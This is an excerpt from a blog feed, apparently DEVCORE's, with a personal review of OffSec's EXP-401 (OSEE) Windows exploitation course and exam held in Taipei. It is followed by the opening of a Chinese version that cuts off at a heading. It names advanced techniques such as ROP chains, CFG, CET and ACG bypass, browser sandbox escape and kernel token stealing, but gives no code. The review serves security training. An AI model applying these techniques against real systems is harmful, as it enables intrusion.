  &lt;li&gt;&lt;strong&gt;72-hour exam challenge&lt;/strong&gt;: OSEE has the longest exam duration of all OffSec certifications. Youâ€™re given two zero-day-style challenges and must develop full working exploits and submit a &lt;strong&gt;detailed report&lt;/strong&gt;, complete with steps and screenshots, within 72 hours.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Although the course recommends familiarity with WinDBG, IDA Pro, x86/x64 assembly, and C/C++, I found that only basic knowledge is needed. The course doesnâ€™t throw overly complex scenarios at you, and any reverse engineering tasks are quite straightforward. The focus is definitely on &lt;strong&gt;writing and refining exploits&lt;/strong&gt;, not deep reverse engineering. So rather than pure RE skills, having experience in &lt;strong&gt;binary exploitation&lt;/strong&gt; (on Windows or Linux) will be far more helpful.&lt;/p&gt;

&lt;h2 id=&quot;before-class&quot;&gt;Before Class&lt;/h2&gt;

&lt;p&gt;After registering, OffSec sends a preparation email detailing the hardware and software requirements. For example, your machine must support NX, SMEP, and VT-x/EPT to ensure you can test all protection mechanisms discussed in class. VMware content (now removed in the latest version) also required nested virtualization, plenty of disk, and RAM.&lt;/p&gt;

&lt;p&gt;Besides, I suggest bringing an extra portable monitor. While remote-debugging a VM, you also need to view slides or tweak exploits in Visual Studio. The constant window-switching is really distracting.&lt;/p&gt;

&lt;p&gt;The mail also contained plenty of reading on concepts and techniques that would be discussed during the class, such as DEP/ASLR/CFG bypass, Windows mitigations, type confusion vulnerabilities, SMEP, token stealing, LFH, and more.&lt;/p&gt;

&lt;h2 id=&quot;class-experience&quot;&gt;Class Experience&lt;/h2&gt;

&lt;p&gt;The course ran at GIS Taipei Tech Convention Center for five consecutive days, 9 AMâ€“6 PM.
I saw a gigantic textbook on each desk when I walking in.
&lt;img src=&quot;/assets/img/blog/20250522/upload_ab82acf8bee146b377b3bc70ff60b756.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Itâ€™s about 600 pages, 3.6 cm thick:
&lt;img src=&quot;/assets/img/blog/20250522/upload_17fdc7d6f806d28d3cb313584b4fe4ec.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In short: &lt;em&gt;huge&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Food and snacks were provided daily. You only had to worry about learning (and bathroom breaks).
Our instructors were &lt;a href=&quot;https://dz.linkedin.com/in/nassereddine-abdelli?trk=public_post_feed-actor-name&quot;&gt;Nassereddine ABDELLI&lt;/a&gt;(&lt;a href=&quot;https://x.com/n4sr0&quot;&gt;@n4sr0&lt;/a&gt;)and &lt;a href=&quot;https://lb.linkedin.com/in/victor-khoury&quot;&gt;Victor Khoury&lt;/a&gt;(&lt;a href=&quot;https://github.com/V-i-x-x&quot;&gt;Vixx&lt;/a&gt;), they are very experienced and interacted constantly, tossing questions to ensure everyone kept up. Even unexpected questions were answered live with hands-on demos. I think thatâ€™s why live training is better than online courses: you can really squeeze every bit of knowledge out of the instructors.&lt;/p&gt;

&lt;p&gt;During the five days, two â€œ&lt;strong&gt;Extra Miles&lt;/strong&gt;â€ challenges were offered. Completing each of them during the week can earn you a challenge coin. There were also small Q\&amp;amp;A quizzes for stickers.&lt;/p&gt;

&lt;p&gt;Near the end of day 1, the instructors impulsively added a mini-challenge: solve an ROP chain in 45 minutes to win a coin. No one succeeded. Orange or Lays joked, â€œAlmost all of Taiwanâ€™s Microsoft Top 100 hackers are here, and still no one cracked it.â€ It looks like OSEE really is tough.&lt;/p&gt;

&lt;h3 id=&quot;day-1&quot;&gt;Day 1&lt;/h3&gt;

&lt;p&gt;We received slides, VMs, and a brief course intro. The most quoted slide online is probably this one:
&lt;img src=&quot;/assets/img/blog/20250522/upload_7b077d2f6c8d86426a5aa31a1876449b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It warned that the difficulty would ramp up dramatically, though I personally felt it wasnâ€™t that extreme. Perhaps this is because these topics (VM, browser, kernel) are everyday fare for vulnerability researchers or just because CTF players are more reluctant.&lt;/p&gt;

&lt;p&gt;A fun Easter egg: a samurai appears at the top of the slides and gradually loses his armor as the course progresses. Its helmet turns into a straw hat, and weapons vanish until heâ€™s just naked. It possibly symbolizes the mystery of Windows being stripped away one by one.&lt;/p&gt;

&lt;p&gt;The first half of the day was a warm-up: Win32 APIs, x64 shellcode, etc. Then, we dove into VMware internals, starting with protections like DEP and ASLR and how to bypass them using ROP. We then explored how VMware Workstation works under the hood.&lt;/p&gt;

&lt;p&gt;I was super impressed with the course materials. Itâ€™s clear that the team behind it consists of highly skilled researchers. The training manual is the crystallization of their careful study and organization. As a result, the content is filled with references. If youâ€™re interested in exploring the original research in more depth, you can easily find further reading materials by following the references provided in the book.&lt;/p&gt;

&lt;p&gt;By the end of the day, I realized I really needed that second screen, so I bought one at the Syntrend that night.&lt;/p&gt;

&lt;h3 id=&quot;day-2&quot;&gt;Day 2&lt;/h3&gt;

&lt;p&gt;We continued with VMware Workstation content. The exploitation is related to the heap, so the day started with Windows Heap internals.&lt;/p&gt;

&lt;p&gt;Then, go into bypassing ASLR, stack pivoting, and defeating DEP. This part really highlighted the courseâ€™s practical value. Unlike CTFs (where stability isnâ€™t essential) or Pwn2Own (where a â€œOne Shotâ€ is enough), this course demands stability. After exploit execution, VMware and Windows must keep running like nothing happened: no crashing, no freezing. (You canâ€™t cheat by freezing the program with a sleep loop.)&lt;/p&gt;

&lt;p&gt;The afternoon shifted to the Edge browser, specifically Chakra Edge, not the current Chromium Edge. The instructors chose Chakra because it enables more native mitigations, letting us practice more Windows exploits. Pure â€œbrowser PWNsâ€ would deserve their own course. Nonetheless, we learned core concepts: type confusion, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addressof&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt;, and crucial debugging workflows.&lt;/p&gt;

&lt;p&gt;Although we havenâ€™t yet delved deeply into the browser-related parts today, the instructor gave us our first Extra Mile challenge: &lt;strong&gt;use ROP to bypass CFG and achieve a sandbox escape exploit&lt;/strong&gt;. (In class, we learned about scenarios with CET enabled, where even ROP would fail.)&lt;/p&gt;

&lt;p&gt;It might sound straightforward, but the instructor specifically required us to wrap the vulnerability into a function that allows ROP to be triggered repeatedly. This approach brings more discipline to the exploit development process and significantly improves development efficiency.&lt;/p&gt;

&lt;p&gt;Of course, there were other challenges to overcome as well, like figuring out how to obtain usable memory addresses. But because I wanted that coin so desperately, I read ahead 100+ pages that we hadnâ€™t even covered yet and started building the exploit. I stayed up until 5 AM but still hadnâ€™t nailed it.&lt;/p&gt;

&lt;h3 id=&quot;day-3&quot;&gt;Day 3&lt;/h3&gt;

&lt;p&gt;Day 3 of the course was entirely focused on Edge, and it was the most fascinating part of the class for me.&lt;/p&gt;

&lt;p&gt;We started with a Type Confusion vulnerability, and the instructor walked us step-by-step through how to manipulate JavaScript objects in Edge to gain control over the RIP (instruction pointer). From there, we moved into a series of modern defense mechanisms, and each time a new mitigation was introduced, we immediately learned how to bypass it. First, we circumvented &lt;strong&gt;Control Flow Guard (CFG)&lt;/strong&gt;, then &lt;strong&gt;Control-Flow Enforcement Technology (CET)&lt;/strong&gt;, followed by &lt;strong&gt;Arbitrary Code Guard (ACG)&lt;/strong&gt;, and finally, we broke out of the browserâ€™s &lt;strong&gt;low-privileged sandbox&lt;/strong&gt; to execute high-privilege commands on Windows.&lt;/p&gt;

&lt;p&gt;Throughout the process, we not only learned about the protection mechanisms present in modern Windows systems but also gained a deep understanding of their limitations and the techniques to bypass them.&lt;/p&gt;

&lt;p&gt;Even though the material covered in class didnâ€™t exactly follow the same path as the &lt;strong&gt;Extra Mile&lt;/strong&gt; challenges, I managed to complete the &lt;strong&gt;ROP sandbox escape&lt;/strong&gt; challenge during the lectures, making me the &lt;strong&gt;first to earn a challenge coin&lt;/strong&gt;! (though its serial number looked ominous in Mandarin, which means die together):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_83ad2122816ba37db84d7750df28350a.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Later that day, we got the final Extra Mile challenge, this time focused on &lt;strong&gt;Kernel Mode&lt;/strong&gt;: From &lt;strong&gt;Low Integrity&lt;/strong&gt;, exploit a known CVE to launch a high-privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The tricky part here is that, due to the Low Integrity level, you couldnâ€™t use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQuerySystemInformation&lt;/code&gt; to leak kernel addresses. Additionally, the CVE provided during class requires writing a file to complete the exploit, so we have to find a directory where a Low Integrity process can &lt;strong&gt;successfully write files&lt;/strong&gt; in order to place our payload and carry out the attack.&lt;/p&gt;

&lt;p&gt;Butâ€¦ Iâ€™ve decided to reward myself with a good nightâ€™s sleep tonight, so Iâ€™ll just ignore that Extra Mile for now.&lt;/p&gt;

&lt;h3 id=&quot;days-45&quot;&gt;Days 4â€“5&lt;/h3&gt;

&lt;p&gt;The final two days focused on &lt;strong&gt;kernel mode&lt;/strong&gt;: driver and Win32k exploitation, token stealing, ACL NULL-ing, SMEP, page tables, KVA shadow, VBS, kCFG, and more. Stability and clean restoration after exploitation were paramount. Crashing the OS is not acceptable.&lt;/p&gt;

&lt;p&gt;Despite five long days, the room only grew more excited. As Lays put it, â€œNobody usually cares about Windows, so five straight days on it is a blast.â€ By the end, people were literally standing around the instructors, watching live demos of WinDBG and exploit fixes. The energy stayed high right through the final minute.&lt;/p&gt;

&lt;p&gt;I ended up earning both challenge coins. But rumor has it that a student got overconfident from winning both challenge coins and didnâ€™t study enough for the examâ€¦ which made me a little nervous too.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_29009efc9ab35f26cdb952f962900dfb.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;post-class-reflections&quot;&gt;Post-Class Reflections&lt;/h2&gt;

&lt;h3 id=&quot;immersive-flow&quot;&gt;Immersive Flow&lt;/h3&gt;

&lt;p&gt;The week-long in-person training was an incredibly immersive flow-state experience. For five full days, my entire world revolved around Windows exploitation, there was barely room for anything else. With the Extra Miles reward system in place, I felt like I was even writing exploits in my dreams.&lt;/p&gt;

&lt;p&gt;To ensure system stability and maximize development speed, I had to carefully choose the right exploitation approaches from the beginning. That also meant cultivating solid coding habits. This not only improved debugging clarity but also reduced future errors and saved time revisiting concepts.&lt;/p&gt;

&lt;h3 id=&quot;learning-resources&quot;&gt;Learning Resources&lt;/h3&gt;

&lt;p&gt;A common question I get in my DMs is whether thereâ€™s a recommended learning path for EXP-401. Should you take any prerequisite courses or study specific materials? Honestly, the course itself is comprehensive enough that no additional preparation is strictly necessary. But if youâ€™re still unsure whether itâ€™s the right fit for you, here are a few free resources to test the waters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HackSys Extreme Vulnerable Driver (HEVD)&lt;/a&gt;:&lt;/strong&gt; A purposely vulnerable Windows driver project, great for practicing kernel-mode exploitation.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://p.ost2.fyi/&quot;&gt;OpenSecurityTraining2&lt;/a&gt;:&lt;/strong&gt; A fantastic collection of free courses created by security researchers, covering topics like x86-64 OS Internals and WinDbg basics.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These are high-quality, well-maintained resources often used by beginners to build a solid foundation. (Although personally, Iâ€™ve spent less than two hours on them in total.)&lt;/p&gt;

&lt;p&gt;For more advanced learners, try reproducing 1-day exploits with public write-ups. For example, I wrote a full exploit for one Win32k vulnerability covered in the course a year or two ago, albeit not very stable. Researchers like Angelboy have also written about some of the more challenging vulnerabilities mentioned in the course. Reproducing these is an excellent way to learn the whole process of exploit development: gathering information, locating the bug, bypassing protections, and understanding unique Windows mechanisms.&lt;/p&gt;

&lt;h3 id=&quot;value-of-the-course&quot;&gt;Value of the Course&lt;/h3&gt;

&lt;p&gt;EXP-401 is essentially a carefully distilled, high-quality crash course by OffSec, offering insights rarely found in public resources. For those in research, youâ€™ll know that even when youâ€™re aware of certain protections or system designs, diving into their actual implementations often requires starting from scratch, which means collecting scattered documentation, reading code, and reasoning through endless trial and error.&lt;/p&gt;

&lt;p&gt;When trying to understand a large and complex system, you often face a similar challenge: the system contains many critical components and mechanisms, but the relevant research is usually scattered across more than a decade of material. The first step is to invest time into searching for and organizing past research, gradually mapping out how these components interact. Only then can you begin to understand under what conditions each mechanism might fail, and eventually piece together a coherent, complete picture. Research results derived from this kind of deep, painstaking synthesis are rarely shared openly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EXP-401&lt;/strong&gt;, however, distills that level of research into a course and shares it with participants with no holding back. Starting from the earliest days of DEP, each subsequent defense mechanism is layered on top of the last. The course walks you step-by-step through this historical evolution. What problem was each layer of protection designed to solve? How did attackers eventually find ways to bypass it?&lt;/p&gt;

&lt;p&gt;By the end of the course, students gain a clear mental map of the Windows ecosystem. You learn how and why each mitigation was introduced, how it works, how itâ€™s bypassed, and where its weaknesses lie. This isnâ€™t just about writing exploits. Itâ€™s about truly understanding the underlying story and logic of Windows internals.&lt;/p&gt;

&lt;h3 id=&quot;is-the-course-still-relevant-today&quot;&gt;Is the Course Still Relevant Today?&lt;/h3&gt;

&lt;p&gt;The EXP-401 course primarily centers on &lt;strong&gt;Windows security mechanisms and exploitation techniques&lt;/strong&gt;, with minimal focus on outdated technologies. As a result, the protection mechanisms introduced throughout the course are all still &lt;strong&gt;relevant and effective in modern Windows systems&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Beyond just explaining the security mechanisms, the course is supplemented with various &lt;strong&gt;supporting materials&lt;/strong&gt;. These materials arenâ€™t meant to simulate real-world environments perfectly but to illustrate different scenarios and stimulate critical thinking about exploitation strategies. For example, the course uses a version of &lt;strong&gt;Microsoft Edge with the Chakra engine&lt;/strong&gt;. While Chakra-based Edge is no longer in use today, it still serves as a valuable case study from the perspective of &lt;strong&gt;Windows-level protections&lt;/strong&gt;. Thatâ€™s because, regardless of the browser in question, once a vulnerability is found, the &lt;strong&gt;system-level challenges&lt;/strong&gt; faced during exploit development remain largely the same.&lt;/p&gt;

&lt;p&gt;Of course, the &lt;strong&gt;in-browser challenges&lt;/strong&gt; do differ between browsers. For instance, Chrome introduces an additional layer of complexity with its own custom &lt;strong&gt;sandboxing mechanism&lt;/strong&gt;, which adds application-specific hurdles. But itâ€™s important to understand that &lt;strong&gt;unless this course were specifically about browser exploit development&lt;/strong&gt;, itâ€™s unrealistic to expect deep coverage of browser-specific defenses.&lt;/p&gt;

&lt;p&gt;In summary, if your focus is strictly on &lt;strong&gt;Windows OS-level protection mechanisms and exploitation techniques&lt;/strong&gt;, the content of &lt;strong&gt;EXP-401 remains highly relevant and applicable even today&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;will-it-help-you-get-a-job&quot;&gt;Will It Help You Get a Job?&lt;/h3&gt;

&lt;p&gt;Short answer: &lt;strong&gt;It helps, but not significantly&lt;/strong&gt;. Hereâ€™s why:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;If youâ€™re aiming for red teaming:&lt;/strong&gt; Holding the OSEE alone doesnâ€™t prove much unless you also demonstrate a red team mindset. Exploit skills help, but thinking like an adversary matters more.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;If youâ€™re aiming for security research:&lt;/strong&gt; OSEE is only an entry badge. Getting the OSEE only shows you can handle some technical problems, but real research is about driving your own projects and solving novel problems independently.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As a researcher myself, Iâ€™d say certifications arenâ€™t essential. Research quality is proven through results and published work, not certs. But before reaching that point, you need a solid knowledge base. And thatâ€™s where EXP-401 really shines.&lt;/p&gt;

&lt;p&gt;In a way, EXP-401 is like tracing a masterâ€™s artwork. You follow in the footsteps of top researchers, learning how protections are introduced, understood, and bypassed. You gain not just technical skills but also the thought process and methodology behind real-world vulnerability research. These skills translate well beyond Windows. It can also be applied to IoT, Linux, macOS research, and more.&lt;/p&gt;

&lt;p&gt;So yes, the course is more valuable than the cert alone. But if youâ€™re paying for it, might as well earn that cert too.&lt;/p&gt;

&lt;h2 id=&quot;report-writing&quot;&gt;Report Writing&lt;/h2&gt;

&lt;p&gt;As mentioned earlier, the OSEE exam consists of two challenges. OffSec has designed a series of vulnerabilities for this purpose, and to simulate real-world scenarios, each vulnerability is accompanied by corresponding CVE advisories and simulated blog posts. The blog posts mainly introduce how the program works and methods previously used to exploit, while the CVE advisories describe the type of vulnerability but do not specify the exact location, trigger method or provide a PoC. Candidates must rely on these clues to reverse-engineer the binaries, identify the vulnerabilities, write code to trigger them, and ultimately bypass all protection mechanisms to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt; file in order to complete the challenge.&lt;/p&gt;

&lt;p&gt;The exam time is arranged as: &lt;strong&gt;72 hours to complete the exploit, 24 hours to complete the report&lt;/strong&gt;. However, in practice, time is far less abundant than it seems. This will be explained later.&lt;/p&gt;

&lt;p&gt;The specific grading criteria can be found in the official OSEE report template: &lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt;. Each challenge is worth 50 points. Completing only half of a challenge will only earn 25 points, and the passing score is 75 points. For example, according to the first question in the report template, if you achieve code execution but fail to complete sandbox escape, you only get 25 points. Similarly, for the second question, if you achieve Read/Write Primitive but fail to escalate privileges, you also only get 25 points.&lt;/p&gt;

&lt;p&gt;Although I completed the course in August last year, I was way too busy to schedule the exam. In September and October, I was mainly focused on researching Pwn2Own targets (eventually successfully exploiting AeoTec). At the end of the year, I was preparing for a CCC talk, followed by SITCON at the beginning of the year, and then DEVCORE Conf in March. In the end, I barely managed to squeeze in an OSEE exam on 2/24.&lt;/p&gt;

&lt;p&gt;The exam started at 8:00 AM. I quickly achieved code execution for the first question and earned 25 points. However, I overlooked a detail and got stuck on sandbox escape. So, the next day, I switched to the second question and solved it around 2:00 PM, earning 50 points. I spent the remaining half-day grinding on the first question and finally beat it at 2:00 AM. We were talking about being the first in Taiwan to get an OSEE, but now I think it makes more sense to aim for an â€œOSEE Speedrun.â€ I basically lived a normal life during those few days (aside from having a camera pointed at my dumb face, it was fairly normal) and even had time to practice piano. If I hadnâ€™t messed up on the first day, finishing in a day seemed possible.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Timeline
    &lt;ul&gt;
      &lt;li&gt;2/24 08:00:00: Exam started at 8:00 AM&lt;/li&gt;
      &lt;li&gt;2/25 14:04:52: Solved the second question&lt;/li&gt;
      &lt;li&gt;2/26 02:41:43: Solved the first question, completed the exam&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The rest of the time was spent focusing on writing the report.&lt;br /&gt;
As mentioned earlier, candidates must &lt;strong&gt;complete the exploit within 72 hours&lt;/strong&gt;, and then &lt;strong&gt;complete the report within the next 24 hours&lt;/strong&gt;. However, in reality, the time is not nearly as sufficient as it seems, because the OSEE report requirements are extremely strict.&lt;/p&gt;

&lt;p&gt;Take the official template &lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt; for example, youâ€™ll see that the entire structure is meticulously detailed, with sections like â€œ2.2 Initial Exploitationâ€, â€œ2.3 Read and Write Primitiveâ€, â€œ2.4 Code Executionâ€, â€œ2.5 Sandbox Escapeâ€, and so on.&lt;/p&gt;

&lt;p&gt;When we write exploits normally, we usually just proceed linearly and rarely document every intermediate step. However, you have to break down each stage clearly during the exam. Not only must you explain how you exploited the vulnerability, but you must also provide concrete proof of bypassing protection mechanisms, along with copy-paste-ready code. For example, in the â€œRead and Write Primitiveâ€ stage, you might just check this in passing and move on in normal dev flow. But in the report, you must prove you can do this. A common approach is to write a small PoC that reads/writes an inaccessible memory region, with debugger screenshots as supporting evidence.&lt;/p&gt;

&lt;p&gt;However, the &lt;strong&gt;exam machine is only available for 72 hours, and all data downloads are prohibited&lt;/strong&gt;. This means that if you donâ€™t collect all the required screenshots, evidence, and intermediate steps within those 72 hours, writing the report later will be extremely painful, and you might even fail due to lack of evidence. Therefore, itâ€™s impossible to write the report afterward by trying to break down the PoC into stages cause youâ€™ll be missing necessary screenshots and wonâ€™t be able to verify if the PoC still works. The safest strategy is: Within 72 hours, not only complete the exploit but also simultaneously write PoCs, gather all data, and draft the main content of the report.&lt;/p&gt;

&lt;p&gt;There have been cases where candidates scored a full 100 points during the exploit phase but failed the exam because the report was not detailed enough. So, I was terrified and submitted a 100-page report.&lt;/p&gt;
&lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;

&lt;p&gt;At the time, the exam didnâ€™t feel that hard. Some may have seen &lt;a href=&quot;https://www.facebook.com/share/p/16W1Jo4eqp/&quot;&gt;Xu Muyuanâ€™s post&lt;/a&gt; about the low pass rate, but for anyone who dares to call themselves a researcher, this exam should be easy enough to make you laugh.&lt;/p&gt;

&lt;p&gt;Once I submitted everything, I waited for OffSec to review it. They say it can take up to 10 business days. I finally got the pass notification on March 10.&lt;/p&gt;

&lt;p&gt;Itâ€™s rumored that this is the &lt;strong&gt;first OSEE certification in Taiwan&lt;/strong&gt;, soâ€¦ achievement is unlocked!
&lt;img src=&quot;/assets/img/blog/20250522/upload_b03d6106afb193bc29194272198cf43b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A bit sad that OffSec no longer sends physical certificates or cards. I really wanted a physical OSEE card for the memories. I still have my OSCP card, which is a treasured keepsake.&lt;/p&gt;

&lt;h2 id=&quot;bonus-upcoming-live-training-by-devcore-august-2025&quot;&gt;Bonus: Upcoming live training by DEVCORE (August 2025)&lt;/h2&gt;

&lt;p&gt;DEVCORE will once again host OffSecâ€™s  live training this August, offering:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PEN-300:&lt;/strong&gt; Advanced Evasion Techniques&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;WEB-300:&lt;/strong&gt; Advanced Web Attacks&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EXP-401:&lt;/strong&gt; Advanced Windows Exploitation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If youâ€™re interested, I recommend registering early. Early bird pricing is much cheaper and the price increases over time.&lt;/p&gt;

&lt;p&gt;More info: &lt;a href=&quot;https://training.devco.re/2025&quot;&gt;DEVCORE &amp;amp; OffSec Live Training 2025&lt;/a&gt;
&lt;img src=&quot;/assets/img/blog/20250522/upload_b7cab66943df4921db18bbd3c37487f8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei/</link>
                <guid>https://devco.re/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei</guid>
                <pubDate>Tue, 27 May 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;2024 å¹´ 8 æœˆï¼ŒDEVCORE è·Ÿ OffSec åœ¨å°åŒ—è¾¦äº†ä¸€å ´ Live Trainingï¼Œç¸½å…±æœ‰å››é–€èª²å¯ä»¥å ±åï¼šSOC-200ã€WEB-200ã€PEN-200ã€EXP-401ï¼Œé€™æ˜¯ç¬¬ä¸€æ¬¡çœ‹åˆ° OffSec åœ¨å°ç£è¾¦ Live Trainingã€‚ç•¶ç„¶ï¼Œå…¶ä¸­æˆ‘æœ€æ„Ÿèˆˆè¶£çš„è‚¯å®šæ˜¯ EXP-401ï¼Œä¹Ÿå«åš Advanced Windows Exploitationï¼ˆAWEï¼‰ï¼Œæ›´å¤šäººçŸ¥é“çš„æ˜¯ä»–çš„è­‰ç…§åç¨±ã€ŒOSEEã€ã€‚&lt;/p&gt;

&lt;p&gt;OSEE æ˜¯ OffSec è£¡é¢æœ€é›£çš„ä¸€å¼µè­‰ç…§ï¼Œæˆªè‡³ç›®å‰ç‚ºæ­¢ï¼Œå…¨çƒå¤§ç´„åªæœ‰åªæœ‰ä¸€åˆ°å…©ç™¾äººï¼Œé€šéç‡ç”šè‡³åªæœ‰ 10% å·¦å³ã€‚æˆ‘å€‘ä¸€ç›´å¾ˆæƒ³æŒ‘æˆ°çœ‹çœ‹é€™å¼µå‚³èªªä¸­çš„è­‰ç…§åˆ°åº•æœ‰å¤šé›£ï¼Œä¸éå°±æ˜¯ä¸€å¼µè­‰ç…§åˆ°åº•æ˜¯èƒ½é›£åˆ°å“ªè£¡å»ï¼Ÿ&lt;/p&gt;

&lt;p&gt;åœ¨ DEVCOREï¼Œæˆ‘å€‘å¾ˆæ—©å°±é–‹å§‹çµ±è¨ˆï¼Œå¦‚æœå°ç£æœ‰æ©Ÿæœƒä¸Š OSEEï¼Œç©¶ç«Ÿæœ‰å¤šå°‘äººæƒ³å»ï¼Ÿé‚£æ™‚å€™æˆ‘çš„ç¬¬ä¸€å€‹å¿µé ­å°±æ˜¯ï¼šã€Œå°±ç®—è‡ªè²»ä¹Ÿè¦ä¸Šï¼ã€åŸå› å¾ˆç°¡å–®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OSEE &lt;strong&gt;åƒ…æä¾›ç¾å ´æˆèª²&lt;/strong&gt;ï¼Œå®Œå…¨æ²’æœ‰ç·šä¸Šç‰ˆã€‚&lt;/li&gt;
  &lt;li&gt;éå»è¦ä¸Šé€™é–€èª²ï¼Œ&lt;strong&gt;ä¸€å®šå¾—å‡ºåœ‹&lt;/strong&gt;ï¼Œæœ€æœ‰åçš„å ´æ¬¡å°±æ˜¯æ¯å¹´ Black Hat USA çš„ç¾å ´èª²ç¨‹ã€‚&lt;/li&gt;
  &lt;li&gt;å ±åéå¸¸å›°é›£ï¼Œå¸¸å¸¸é–‹æ”¾æ²’å¤šä¹…å°±é¡æ»¿ï¼Œç”šè‡³æœ‰äººå¯« script æ¶åé¡ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸è«–è€ƒè©¦çµæœå¦‚ä½•ï¼Œéƒ½èƒ½æˆç‚ºå°ç£ç¬¬ä¸€å€‹ï¼šç¬¬ä¸€å¼µ OSEEï¼Œæˆ–ç¬¬ä¸€å€‹ OSEE ä¸åŠæ ¼ï¼Œä¹Ÿéƒ½ç®—æ˜¯ä¸€ç¨®è§£æˆå°±äº†ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OffSec å®˜æ–¹ç¶²ç«™æœ‰ä¸€å€‹é é¢å°ˆé–€ç”¨ä¾†å…¬å¸ƒå¯¦é«”è¨“ç·´èª²ç¨‹ï¼š &lt;a href=&quot;https://www.offsec.com/training-and-events/&quot;&gt;Upcoming Live Training &amp;amp; Events | OffSec&lt;/a&gt;ã€‚è€Œ EXP-401 æœ€å»£ç‚ºäººçŸ¥çš„å ´æ¬¡ï¼Œå°±æ˜¯æ¯å¹´ 8 æœˆåœ¨æ‹‰æ–¯ç¶­åŠ æ–¯ Black Hat USA æœƒå ´èˆ‰è¾¦çš„ Live Trainingã€‚ç²—ç®—ä¸€ä¸‹ï¼Œå¾å°åŒ—é£›åˆ°æ‹‰æ–¯ç¶­åŠ æ–¯çš„ä¾†å›æ©Ÿç¥¨ï¼ŒåŠ ä¸Šä¸Šèª²æœŸé–“çš„ä½å®¿è²»ï¼Œè‡³å°‘è¦èŠ±ä¸Šä¸€å¤§ç­†éŒ¢ã€‚å› æ­¤ï¼Œèƒ½åœ¨å°åŒ—ä¸Šèª²ï¼Œå…‰æ˜¯çœä¸‹çš„æ—…è²»å°±è¶…éåè¬ï¼Œç°¡ç›´æ˜¯è³ºåˆ°ã€‚&lt;/p&gt;

&lt;p&gt;ç¸½çµä¾†èªªï¼Œæˆ‘èªç‚ºé€™æ˜¯ç›®å‰çœ‹éæœ€æ£’çš„è¨“ç·´èª²ç¨‹ï¼Œéå¸¸æ¨è–¦åƒåŠ ã€‚å³ä¾¿ä¸æ˜¯å°ˆé–€åš Windows ç ”ç©¶çš„äººï¼Œä¹Ÿèƒ½å¾ä¸­ç²å¾—å¾ˆå¤šæ¨‚è¶£ã€‚ä¸Šèª²çš„ç›®æ¨™ä¸å¿…è¨­å®šåœ¨æ‹¿åˆ° OSEE è­‰ç…§ï¼ˆç•¶ç„¶ï¼Œå¦‚æœè€ƒéæœƒæ›´çˆ½ï¼‰ï¼Œå…‰æ˜¯ä¸Šèª²æœ¬èº«ï¼Œå°±å·²ç¶“æ˜¯ä¸€æ®µè¶…æ£’çš„é«”é©—äº†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä»‹ç´¹&quot;&gt;ä»‹ç´¹&lt;/h2&gt;

